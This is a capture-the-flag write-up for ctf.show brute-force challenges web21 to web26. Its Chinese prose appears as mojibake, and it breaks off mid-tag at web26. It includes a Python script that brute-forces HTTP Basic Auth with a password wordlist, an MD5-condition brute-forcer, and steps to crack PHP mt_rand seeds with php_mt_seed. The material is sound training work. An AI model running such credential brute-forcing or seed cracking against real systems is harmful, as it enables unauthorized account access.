        <content type="html"><![CDATA[<h1 id="ç›¸å…³æ–‡ç« åŠå‚è€ƒèµ„æ–™"><a href="#ç›¸å…³æ–‡ç« åŠå‚è€ƒèµ„æ–™" class="headerlink" title="ç›¸å…³æ–‡ç« åŠå‚è€ƒèµ„æ–™"></a>ç›¸å…³æ–‡ç« åŠå‚è€ƒèµ„æ–™</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16053552.html"> æš´åŠ›ç ´è§£(ç”Ÿæˆå­—å…¸ã€çˆ†ç ´æœåŠ¡ã€çˆ†ç ´ç™»å½•ã€è§£å¯†ã€BurpSuiteå·¥å…·è®²è§£) </a></p></blockquote><h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p><del>åšå®Œäº†æˆ‘æ‰å‘ç°è¿™äº›é¢˜çš„å­—å…¸å®åœ¨web21é‡Œé¢éœ€è¦ä¸‹è½½â€¦</del></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><blockquote><p>çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</p></blockquote><blockquote><p>burpsuiteçˆ†ç ´ï¼š<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">https://www.cnblogs.com/007NBqaq/p/13220297.html</a></p></blockquote><p>ç›´æ¥å±•ç¤ºç™»é™†ç•Œé¢ï¼Œéšä¾¿è¾“ç‚¹ä»€ä¹ˆï¼ŒæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°æŠŠè´¦å·å¯†ç æ”¾åœ¨äº†è¯·æ±‚å¤´ä¸­ï¼Œå¹¶ä¸”æ ¹æ®æœ«å°¾çš„==å¯ä»¥çœ‹å‡ºæ˜¯base64åŠ å¯†ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥å°è¯•Intruderæ¨¡å—çˆ†ç ´ã€‚<br>åŸç†æˆ‘ä»¬éƒ½æ‡‚ï¼Œä½†æ˜¯æˆ‘ä»¬è¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿ</p><h2 id="æ–¹æ¡ˆä¸€-burpsuiteçˆ†ç ´"><a href="#æ–¹æ¡ˆä¸€-burpsuiteçˆ†ç ´" class="headerlink" title="æ–¹æ¡ˆä¸€ burpsuiteçˆ†ç ´"></a>æ–¹æ¡ˆä¸€ burpsuiteçˆ†ç ´</h2><p>å°†è¯·æ±‚è½¬å…¥intruderï¼Œå› ä¸ºä¼šæ‹¼æ¥payloadï¼Œæ‰€ä»¥ä½¿ç”¨åŸºæœ¬çš„sniperç±»å‹å°±è¡Œï¼Œåœ¨payload setsé‡Œé¢ä¿®æ”¹payload tpeä¸º<code>Custom Interator</code>ï¼Œå¹¶ä¸”åœ¨payload optionä¸­æŒ‰ç…§é¡ºåºä¿®æ”¹ä¸‰ä¸ªpositionã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726131628-7ca04364-333b-48e3-bdaf-bd5ff55d6c8f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726143875-172fd7f8-7d60-4f5c-8d79-57aec5d46650.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726152940-8e723666-ba55-4d24-8e87-9123771ee382.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726186298-73d9efbc-8154-40c3-b2f0-2ffdbccf833a.png" alt="image.png"><br>è€Œä¸”æˆ‘ä»¬è§‚å¯Ÿå¯ä»¥æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†payloadä½¿ç”¨base64åŠ å¯†ï¼Œå› æ­¤åœ¨payload processingé‡Œé¢æ·»åŠ è½¬æ¢ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726245072-04e6ff20-acd9-45aa-a639-db4e41b833f7.png" alt="image.png"><br>æœ€åå†å°†æœ«å°¾çš„è½¬ä¹‰å…³é—­ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726288398-49c8a4bd-7ee2-4cb6-b38c-8c3cdb8614be.png" alt="image.png"><br>è¿™ç§æƒ…å†µä¸‹çˆ†ç ´å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677727052915-6090cb47-a08f-4b1a-b670-0f34b353ce1d.png" alt="image.png"></p><h2 id="æ–¹æ¡ˆäºŒ-è„šæœ¬çˆ†ç ´"><a href="#æ–¹æ¡ˆäºŒ-è„šæœ¬çˆ†ç ´" class="headerlink" title="æ–¹æ¡ˆäºŒ è„šæœ¬çˆ†ç ´"></a>æ–¹æ¡ˆäºŒ è„šæœ¬çˆ†ç ´</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-11-20 19:16:49</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-11-20 20:28:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = f.<span class="title function_ invoke__">readline</span>() </span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">    password.<span class="title function_ invoke__">append</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p in password:</span><br><span class="line">strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(base64.<span class="title function_ invoke__">b64encode</span>(strs.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">rep =requests.<span class="title function_ invoke__">get</span>(url,headers=header)</span><br><span class="line">time.<span class="title function_ invoke__">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span>(rep.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><blockquote><p>åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå</p></blockquote><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><blockquote><p>è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜è€ƒçš„æ˜¯è„šæœ¬ç¼–å†™ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">dic = <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a in dic:</span><br><span class="line">    <span class="keyword">for</span> b in dic:</span><br><span class="line">        t = <span class="title function_ invoke__">str</span>(a) + <span class="title function_ invoke__">str</span>(b)</span><br><span class="line">        md5 = hashlib.<span class="title function_ invoke__">md5</span>(t.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">        <span class="comment"># print(md5)</span></span><br><span class="line">        <span class="comment"># print(md5[1:2])</span></span><br><span class="line">        <span class="comment"># print(md5[14:15])</span></span><br><span class="line">        <span class="comment"># print(md5[17:18])</span></span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>]== md5[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">1</span>:<span class="number">2</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) &lt;= <span class="number">57</span> <span class="keyword">and</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">14</span>:<span class="number">15</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) &lt;= <span class="number">57</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">17</span>:<span class="number">18</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">17</span>:<span class="number">18</span>]) &lt;= <span class="number">57</span> <span class="keyword">and</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">31</span>:<span class="number">32</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(</span><br><span class="line">                        md5[<span class="number">31</span>:<span class="number">32</span>]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) + <span class="keyword">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) + <span class="keyword">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>])) / <span class="keyword">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) == <span class="keyword">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                        <span class="keyword">print</span>(t)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æˆ‘æœ€å¼€å§‹å†™çš„æ—¶å€™æ²¡æœ‰12-14è¡Œï¼Œè™½ç„¶ä¼šæŠ¥é”™ä½†æ˜¯ä¹Ÿèƒ½è¿è¡Œï¼Œwpä¸­å°†å…¶å®Œå–„äº†ä¸€ä¸‹ã€‚å¾—åˆ°è¿è¡Œç»“æœ<code>3j</code><br>ç›´æ¥postä¼ å…¥å³å¯å¾—åˆ°flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677728759208-d504308e-6a04-47f2-a1ed-32f22148ac7c.png" alt="image.png"></p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Qï¼šè¿™é‡Œä¸ºä»€ä¹ˆåˆ†åˆ«ç”¨ordå’Œintï¼š<br>Aï¼šintæ”¹å˜æ•°æ®ç±»å‹ï¼Œå¤–å‹ä¸å˜ï¼›ordæ”¹å˜æ•°æ®ç±»å‹ï¼Œå€¼ä¸æ”¹å˜ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677729322819-fdd917cf-96e9-440e-9537-4ecd5ca16fe9.png" alt="20180517204019346.png"></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><blockquote><p>çˆ†ä¸ªğŸ”¨</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ–¹æ¡ˆä¸€"><a href="#æ–¹æ¡ˆä¸€" class="headerlink" title="æ–¹æ¡ˆä¸€"></a>æ–¹æ¡ˆä¸€</h2><p>ä»£ç ä¸­çš„<code>mt_srand()</code>ä¸ºéšæœºæ•°ç”Ÿæˆå™¨è®¾å®šç§å­ï¼Œå¯ä»¥ä¹‹åè°ƒç”¨éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå¯ä»¥ä¿è¯éšæœºæ•°ç”Ÿæˆçš„ç›¸åŒã€‚æ‰€ä»¥è¿™é¢˜å¾ˆæ˜ç¡®äº†ï¼Œç›´æ¥æ‰¾åˆ°ç”Ÿæˆçš„éšæœºæ•°å³å¯ã€‚<br>ç”¨PHPStormæ‰¾ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830788193-57352fa8-4703-4b29-b7b6-6b8e4eeaa326.png" alt="image.png"><br>ç„¶åç›´æ¥getä¼ å…¥å³å¯ï¼š<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830905489-9c6c4461-458d-4ca6-a1a2-9638ac7bf795.png" alt="image.png"></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><blockquote></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>hexdec()</code>å‡½æ•°å°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºåè¿›åˆ¶ã€‚<br><del>çŒªè„‘è¿‡è½½äº†ï¼Œå¼€å§‹æ‰“ç®—å†™è„šæœ¬è·‘å‡ºæ¥ç¬¬ä¸€ä¸ªï¼ˆç¬¬ä¸ƒè¡Œï¼‰çš„mt_rand()çš„å€¼ï¼Œä½†ä¼¼ä¹ç›´æ¥ç»™rä¼ å…¥0å°±è¡Œâ€¦â€¦</del><br>ç›´æ¥å°†rä¼ å…¥0ï¼Œå¾—åˆ°ç¬¬ä¸€ä¸ªmt_randçš„å€¼<code>1277101134</code>ï¼ˆå³æ—¶ç”Ÿæˆçš„ï¼‰ã€‚è¿™æ—¶å€™ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å°±è½¬åŒ–ä¸ºå°è¯•æ‰¾åˆ°åŸç§å­çš„å€¼ã€‚åœ¨æœç´¢ä¹‹åï¼Œå‘ç°æœ‰ä¸€ä¸ªphp_mt_seedçš„é¡¹ç›®å¯ä»¥å°è¯•ç ´è§£å‡ºåŸç§å­çš„å€¼ã€‚</p><h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p>ä¸‹è½½ï¼š<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a><br>ä¸‹è½½ä¹‹åç›´æ¥åœ¨kaliä¸­è§£å‹ä¸­å³å¯ï¼ˆå¯ä»¥ä½¿ç”¨windowsï¼Œä½†æ˜¯éœ€è¦g++ç¼–è¯‘ï¼Œå› ä¸ºä¹‹å‰æ²¡å®‰è£…è¿‡ï¼‰<br>è§£å‹ä¹‹åéœ€è¦å…ˆmakeä¸€ä¸‹ç”Ÿæˆæ–‡ä»¶ï¼ˆæˆ‘è¿™é‡Œåˆšåˆšæ›´æ–°è¿‡ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839965380-57f4b720-0465-4dba-8c73-d7ace551f01b.png" alt="image.png"><br>ç„¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed <span class="number">1277101134</span></span><br></pre></td></tr></table></figure><p>ç­‰å¾…å®ƒæ‰¾åˆ°seedã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840306922-3ff2ae19-0589-40ec-93d8-516e45d2ee81.png" alt="image.png"><br>ç„¶åå°†ç”Ÿæˆçš„mt_rand()çš„ç»“æœç›¸åŠ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="number">3352708826</span>, <span class="number">3352708827</span>, <span class="number">72059293</span>, <span class="number">379534775</span>, <span class="number">2177040484</span>, <span class="number">2437797623</span>, <span class="number">3102727756</span>, <span class="number">3907641824</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$f</span> = <span class="number">0</span>; <span class="variable">$f</span> &lt; <span class="number">11</span>; <span class="variable">$f</span>++)&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$a</span>[<span class="variable">$f</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span> + <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840379255-b1b12693-291d-4300-a0c8-4005848709f9.png" alt="image.png"><br>ç„¶åå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªå°è¯•è¿›å»å¾—åˆ°flagï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839267980-50ace50b-01b0-4096-b744-2d70dec7b52a.png" alt="image.png"></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>ä¸Šæ¥å°±æ˜¯è¿æ¥æ•°æ®åº“ï¼Œä½†æ˜¯ä¼¼ä¹å…¨ä¸ºç©ºçš„æ—¶å€™å°±è¿æ¥æˆåŠŸäº†ï¼Œåº”è¯¥æ˜¯bugã€‚<br><img 